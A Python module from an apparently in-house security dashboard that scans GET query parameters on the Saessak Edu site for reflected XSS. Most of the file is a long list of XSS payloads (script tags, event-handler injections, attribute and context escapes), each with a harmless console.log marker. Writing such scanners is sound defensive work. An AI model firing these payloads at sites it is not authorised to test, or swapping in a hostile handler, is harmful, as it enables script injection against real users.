"""새싹에듀 반사형 XSS — 단일 모듈. GET 쿼리 입력이 HTML 응답에 그대로 되비치는지.

표면 수집(surface_crawl)으로 모은 GET 쿼리 지점을 표면 탭에서 골라 돌린다. 지점마다
입력값(payload)을 넣어 보내고, 응답(text/html)에 원문이 이스케이프 없이 그대로 남으면
반사형 XSS 후보로 올린다. 결과에 '넣은 입력값' 을 남긴다. 다른 파일 의존 없음.

sesacedu.store 는 현재 React SPA 라 서버측 반사면이 거의 없지만, 서버 렌더 페이지·에러
페이지·관리자 화면 등 반사 지점이 생기면 여기서 잡는다. 읽기(GET)만 보낸다.
"""
from dashboard import core, probe
from dashboard.core import Check


HANDLER = "console.log('{T}')"


# 고전/탈출 payload — 출력이 이스케이프되지 않는 경우를 노린다
CLASSIC_VECTORS = (
    ('script', 'HTML 본문', '<script>{H}</script>'),
    ('script', '대소문자 변형', '<ScRiPt>{H}</ScRiPt>'),
    ('script', '공백 변형', '<script >{H}</script >'),
    ('img', 'HTML 본문(따옴표 없음)', '<img src=x onerror={H}>'),
    ('img', 'HTML 본문(따옴표)', '<img src="x" onerror="{H}">'),
    ('svg', 'HTML 본문', '<svg onload={H}>'),
    ('svg', '자가닫힘', '<svg/onload={H}>'),
    ('body', 'HTML 본문', '<body onload={H}>'),
    ('iframe', 'javascript: 스킴', '<iframe src="javascript:{H}"></iframe>'),
    ('a', 'javascript: 스킴', '<a href="javascript:{H}">x</a>'),
    ('attr', '속성 탈출(겹따옴표)', '"><script>{H}</script>'),
    ('attr', '속성 탈출(홑따옴표)', "'><script>{H}</script>"),
    ('attr', '속성 탈출(img)', '"><img src=x onerror={H}>'),
    ('attr', '속성 내 이벤트 주입', '" onmouseover="{H}" x="'),
    ('attr', '속성 내 autofocus', '" autofocus onfocus="{H}" x="'),
    ('script-ctx', '스크립트 문자열 탈출', "';{H};//"),
    ('script-ctx', '스크립트 블록 탈출', '</script><script>{H}</script>'),
    ('textarea', 'textarea 탈출', '</textarea><script>{H}</script>'),
    ('title', 'title 탈출', '</title><script>{H}</script>'),
    ('comment', 'HTML 주석 탈출', '--><script>{H}</script>'),
    ('img', 'onerror 슬래시 변형', '<img src=x onerror={H}//>'),
    ('details', 'ontoggle', '<details open ontoggle={H}><summary>x</summary></details>'),
    ('marquee', 'onstart', '<marquee onstart={H}>x</marquee>'),
    ('input', 'autofocus onfocus', '<input autofocus onfocus={H}>'),
)

# 자동 발화 조합(마우스·키보드 조작 없이 실행)
VECTORS = (
    ('img', 'onerror', '<img src="data:," onerror="{H}">'),
    ('img', 'onload', '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACwAAAAAAQABAAA=" onload="{H}">'),
    ('svg', 'onload', '<svg onload="{H}"></svg>'),
    ('iframe', 'onload', '<iframe src="about:blank" onload="{H}"></iframe>'),
    ('body', 'onload', '<body onload="{H}">'),
    ('body', 'onpageshow', '<body onpageshow="{H}">'),
    ('script', 'onerror', '<script src="/vcd-nonexistent.js" onerror="{H}"></script>'),
    ('link', 'onerror', '<link rel="stylesheet" href="/vcd-nonexistent.css" onerror="{H}">'),
    ('link', 'onload', '<link rel="stylesheet" href="data:text/css," onload="{H}">'),
    ('object', 'onerror', '<object data="/vcd-nonexistent" onerror="{H}"></object>'),
    ('input', 'onerror', '<input type="image" src="data:," onerror="{H}">'),
    ('video', 'onerror', '<video src="data:," onerror="{H}"></video>'),
    ('video', 'onloadstart', '<video src="data:video/mp4," onloadstart="{H}"></video>'),
    ('audio', 'onerror', '<audio src="data:," onerror="{H}"></audio>'),
    ('audio', 'onloadstart', '<audio src="data:audio/mpeg," onloadstart="{H}"></audio>'),
    ('details', 'ontoggle', '<details open ontoggle="{H}"><summary>x</summary></details>'),
    ('animate', 'onbegin', '<svg><rect width="5" height="5"><animate attributeName="x" from="0" to="1" dur="1s" onbegin="{H}"/></rect></svg>'),
    ('animate', 'onend', '<svg><rect width="5" height="5"><animate attributeName="x" from="0" to="1" dur="0.2s" onend="{H}"/></rect></svg>'),
    ('animate', 'onrepeat', '<svg><rect width="5" height="5"><animate attributeName="x" from="0" to="1" dur="0.2s" repeatCount="2" onrepeat="{H}"/></rect></svg>'),
    ('set', 'onbegin', '<svg><set attributeName="x" to="1" dur="1s" onbegin="{H}"/></svg>'),
    ('set', 'onend', '<svg><set attributeName="x" to="1" dur="0.2s" onend="{H}"/></svg>'),
    ('animatetransform', 'onbegin', '<svg><rect><animateTransform attributeName="transform" type="scale" from="1" to="2" dur="1s" onbegin="{H}"/></rect></svg>'),
    ('animatemotion', 'onbegin', '<svg><rect><animateMotion dur="1s" onbegin="{H}"/></rect></svg>'),
    ('input', 'onfocus', '<input autofocus onfocus="{H}">'),
    ('textarea', 'onfocus', '<textarea autofocus onfocus="{H}"></textarea>'),
    ('select', 'onfocus', '<select autofocus onfocus="{H}"><option>x</option></select>'),
    ('button', 'onfocus', '<button autofocus onfocus="{H}">x</button>'),
    ('keygen', 'onfocus', '<keygen autofocus onfocus="{H}">'),
    ('a', 'onfocus', '<a tabindex="1" autofocus onfocus="{H}">x</a>'),
    ('div', 'onfocus', '<div tabindex="1" autofocus onfocus="{H}">x</div>'),
    ('span', 'onfocus', '<span tabindex="1" autofocus onfocus="{H}">x</span>'),
    ('section', 'onfocus', '<section tabindex="1" autofocus onfocus="{H}">x</section>'),
    ('article', 'onfocus', '<article tabindex="1" autofocus onfocus="{H}">x</article>'),
    ('p', 'onfocus', '<p tabindex="1" autofocus onfocus="{H}">x</p>'),
    ('label', 'onfocus', '<label tabindex="1" autofocus onfocus="{H}">x</label>'),
    ('strong', 'onfocus', '<strong tabindex="1" autofocus onfocus="{H}">x</strong>'),
    ('em', 'onfocus', '<em tabindex="1" autofocus onfocus="{H}">x</em>'),
    ('b', 'onfocus', '<b tabindex="1" autofocus onfocus="{H}">x</b>'),
    ('i', 'onfocus', '<i tabindex="1" autofocus onfocus="{H}">x</i>'),
    ('u', 'onfocus', '<u tabindex="1" autofocus onfocus="{H}">x</u>'),
    ('mark', 'onfocus', '<mark tabindex="1" autofocus onfocus="{H}">x</mark>'),
    ('small', 'onfocus', '<small tabindex="1" autofocus onfocus="{H}">x</small>'),
    ('h1', 'onfocus', '<h1 tabindex="1" autofocus onfocus="{H}">x</h1>'),
    ('h2', 'onfocus', '<h2 tabindex="1" autofocus onfocus="{H}">x</h2>'),
    ('h3', 'onfocus', '<h3 tabindex="1" autofocus onfocus="{H}">x</h3>'),
    ('h4', 'onfocus', '<h4 tabindex="1" autofocus onfocus="{H}">x</h4>'),
    ('h5', 'onfocus', '<h5 tabindex="1" autofocus onfocus="{H}">x</h5>'),
    ('h6', 'onfocus', '<h6 tabindex="1" autofocus onfocus="{H}">x</h6>'),
    ('li', 'onfocus', '<li tabindex="1" autofocus onfocus="{H}">x</li>'),
    ('td', 'onfocus', '<td tabindex="1" autofocus onfocus="{H}">x</td>'),
    ('th', 'onfocus', '<th tabindex="1" autofocus onfocus="{H}">x</th>'),
    ('blockquote', 'onfocus', '<blockquote tabindex="1" autofocus onfocus="{H}">x</blockquote>'),
    ('pre', 'onfocus', '<pre tabindex="1" autofocus onfocus="{H}">x</pre>'),
    ('code', 'onfocus', '<code tabindex="1" autofocus onfocus="{H}">x</code>'),
    ('nav', 'onfocus', '<nav tabindex="1" autofocus onfocus="{H}">x</nav>'),
    ('main', 'onfocus', '<main tabindex="1" autofocus onfocus="{H}">x</main>'),
    ('aside', 'onfocus', '<aside tabindex="1" autofocus onfocus="{H}">x</aside>'),
    ('header', 'onfocus', '<header tabindex="1" autofocus onfocus="{H}">x</header>'),
    ('footer', 'onfocus', '<footer tabindex="1" autofocus onfocus="{H}">x</footer>'),
    ('figure', 'onfocus', '<figure tabindex="1" autofocus onfocus="{H}">x</figure>'),
    ('cite', 'onfocus', '<cite tabindex="1" autofocus onfocus="{H}">x</cite>'),
    ('time', 'onfocus', '<time tabindex="1" autofocus onfocus="{H}">x</time>'),
    ('data', 'onfocus', '<data tabindex="1" autofocus onfocus="{H}">x</data>'),
    ('div', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><div style="animation:vcdkf 1s" onanimationstart="{H}">x</div>'),
    ('span', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><span style="animation:vcdkf 1s" onanimationstart="{H}">x</span>'),
    ('p', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><p style="animation:vcdkf 1s" onanimationstart="{H}">x</p>'),
    ('a', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><a style="animation:vcdkf 1s" onanimationstart="{H}">x</a>'),
    ('section', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><section style="animation:vcdkf 1s" onanimationstart="{H}">x</section>'),
    ('article', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><article style="animation:vcdkf 1s" onanimationstart="{H}">x</article>'),
    ('strong', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><strong style="animation:vcdkf 1s" onanimationstart="{H}">x</strong>'),
    ('em', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><em style="animation:vcdkf 1s" onanimationstart="{H}">x</em>'),
    ('b', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><b style="animation:vcdkf 1s" onanimationstart="{H}">x</b>'),
    ('i', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><i style="animation:vcdkf 1s" onanimationstart="{H}">x</i>'),
    ('u', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><u style="animation:vcdkf 1s" onanimationstart="{H}">x</u>'),
    ('mark', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><mark style="animation:vcdkf 1s" onanimationstart="{H}">x</mark>'),
    ('small', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><small style="animation:vcdkf 1s" onanimationstart="{H}">x</small>'),
    ('h1', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h1 style="animation:vcdkf 1s" onanimationstart="{H}">x</h1>'),
    ('h2', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h2 style="animation:vcdkf 1s" onanimationstart="{H}">x</h2>'),
    ('h3', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h3 style="animation:vcdkf 1s" onanimationstart="{H}">x</h3>'),
    ('h4', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h4 style="animation:vcdkf 1s" onanimationstart="{H}">x</h4>'),
    ('h5', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h5 style="animation:vcdkf 1s" onanimationstart="{H}">x</h5>'),
    ('h6', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><h6 style="animation:vcdkf 1s" onanimationstart="{H}">x</h6>'),
    ('li', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><li style="animation:vcdkf 1s" onanimationstart="{H}">x</li>'),
    ('td', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><td style="animation:vcdkf 1s" onanimationstart="{H}">x</td>'),
    ('th', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><th style="animation:vcdkf 1s" onanimationstart="{H}">x</th>'),
    ('tr', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><tr style="animation:vcdkf 1s" onanimationstart="{H}">x</tr>'),
    ('blockquote', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><blockquote style="animation:vcdkf 1s" onanimationstart="{H}">x</blockquote>'),
    ('pre', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><pre style="animation:vcdkf 1s" onanimationstart="{H}">x</pre>'),
    ('code', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><code style="animation:vcdkf 1s" onanimationstart="{H}">x</code>'),
    ('nav', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><nav style="animation:vcdkf 1s" onanimationstart="{H}">x</nav>'),
    ('main', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><main style="animation:vcdkf 1s" onanimationstart="{H}">x</main>'),
    ('aside', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><aside style="animation:vcdkf 1s" onanimationstart="{H}">x</aside>'),
    ('header', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><header style="animation:vcdkf 1s" onanimationstart="{H}">x</header>'),
    ('footer', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><footer style="animation:vcdkf 1s" onanimationstart="{H}">x</footer>'),
    ('figure', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><figure style="animation:vcdkf 1s" onanimationstart="{H}">x</figure>'),
    ('figcaption', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><figcaption style="animation:vcdkf 1s" onanimationstart="{H}">x</figcaption>'),
    ('caption', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><caption style="animation:vcdkf 1s" onanimationstart="{H}">x</caption>'),
    ('ul', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><ul style="animation:vcdkf 1s" onanimationstart="{H}">x</ul>'),
    ('ol', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><ol style="animation:vcdkf 1s" onanimationstart="{H}">x</ol>'),
    ('dd', 'onanimationstart', '<style>@keyframes vcdkf{from{opacity:1}to{opacity:.99}}</style><dd style="animation:vcdkf 1s" onanimationstart="{H}">x</dd>'),
)

PAYLOADS = CLASSIC_VECTORS + VECTORS


META = {
    "id": "sesacedu_reflected_xss",
    "name": "새싹에듀 반사형 XSS (GET 쿼리)",
    "category": "입력 검증",
    "vuln": "XSS",
    "kind": "active",
    "stage": "probe",
    "roles": ["user_web", "admin_web", "practice"],
    "severity": "medium",
    "attack": [
        {"tactic": "TA0002", "technique": "T1059.007",
         "name": "Command and Scripting Interpreter: JavaScript"},
    ],
    "description": (
        "GET 쿼리 파라미터에 입력값을 넣어, 응답 HTML 에 이스케이프 없이 그대로 "
        "되비치는지 봅니다. 표면 탭에서 GET 쿼리 지점을 골라 실행합니다."
    ),
    "params": [
        {"name": "limit", "need": "optional", "type": "int", "default": str(len(PAYLOADS)),
         "label": "지점당 시험할 입력값 수",
         "help": "앞 %d개는 고전/탈출 payload(<script>·<img>·속성 탈출 등), "
                 "그 뒤는 자동 발화 조합입니다. 전체 %d개." % (len(CLASSIC_VECTORS), len(PAYLOADS))},
    ],
}

TEXT_HTML = "text/html"
RANK = {"safe": 0, "potential": 1, "vuln": 2}


def _context(body, i):
    """반사 위치가 어떤 문맥인지 거친히 본다."""
    before = body[:i].lower()
    if before.rfind("<script") > before.rfind("</script"):
        return "스크립트 블록"
    if before.rfind("<") > before.rfind(">"):
        return "태그 속성"
    return "HTML 본문"


def _judge(resp, payload, marker):
    media = (resp.header("Content-Type") or "").partition(";")[0].strip().lower()
    if marker not in resp.body:
        return "safe", media, ""
    idx = resp.body.find(payload)
    if media == TEXT_HTML and idx >= 0 and not 300 <= resp.status < 400:
        return "vuln", media, "입력이 %s 문맥에 이스케이프 없이 그대로 반사됩니다." % _context(resp.body, idx)
    return "potential", media, "표식은 반사되나 원문이 변형/이스케이프됐습니다(필터 가능)."


def run(target, points, params):
    try:
        limit = int(params.get("limit") or len(PAYLOADS))
    except (TypeError, ValueError):
        limit = len(PAYLOADS)
    limit = max(1, min(limit, len(PAYLOADS)))

    eligible = [p for p in points if p.method == "GET" and p.place == "query" and p.param]
    if not eligible:
        raise ValueError("GET 쿼리 파라미터 지점을 하나 이상 고르세요(표면 탭).")

    results = []
    for point in eligible:
        best = ("safe", None, [])
        completed = 0
        for i in range(limit):
            tag, ctx, template = PAYLOADS[i]
            marker = probe.marker()
            payload = template.replace("{H}", HANDLER.replace("{T}", marker))
            resp = probe.send(point, payload)
            completed += 1
            if resp.status == 429:
                verdict = best[0] if RANK[best[0]] else "potential"
                results.append(Check(point=point, verdict=verdict, response=best[1] or resp,
                    evidence="\n".join([*best[2], "HTTP 429 로 이후 요청을 중단했습니다."])))
                return results
            verdict, media, detail = _judge(resp, payload, marker)
            if RANK[verdict] > RANK[best[0]]:
                best = (verdict, resp, [
                    "조합 %d: %s / %s" % (i + 1, tag, ctx),
                    "넣은 입력값: " + payload,
                    "HTTP %s · %s" % (resp.status, media or "Content-Type 없음"),
                    detail,
                ])
        lines = ["입력값 %d개 전송." % completed,
                 *(best[2] or ["응답에서 표식이 확인되지 않았습니다."]),
                 "HTTP 응답 기준입니다. 실제 실행은 브라우저로 확인하세요."]
        results.append(Check(point=point, verdict=best[0], evidence="\n".join(lines), response=best[1]))
    return results
